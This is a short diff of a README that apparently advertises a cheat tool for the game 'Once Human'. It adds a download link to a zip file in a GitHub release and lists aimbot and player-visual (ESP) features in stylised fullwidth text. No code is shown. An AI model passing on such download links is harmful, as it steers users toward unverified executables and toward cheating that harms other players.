@@ -1,7 +1,7 @@
-# **[Download]()**
+# **[Download](https://github.com/HumberRox/Once-Human-Wave/releases/download/OnceHuMAN-Wve/OnceHumanWave.zip)**
 
 # Features 
-### * ＶＩＳＵＡＬ-ＰＬＡＹＥＲ 
+## * ＶＩＳＵＡＬ-ＰＬＡＹＥＲ 
 - Ｅｎａｂｌｅｄ
 - Ｎａｍｅ
 -   Ｄｉｓｔａｎｃｅ
@@ -28,7 +28,7 @@
 - Ａｌｌ ｅｎｔｉｔｉｅｓ
 
 
-### - ＡＩＭＢＯＴ 
+## - ＡＩＭＢＯＴ 
 - Ａｉｍｂｏｔ
 - Ｅｎａｂｌｅ
 - Ｓｍｏｏｔｈ
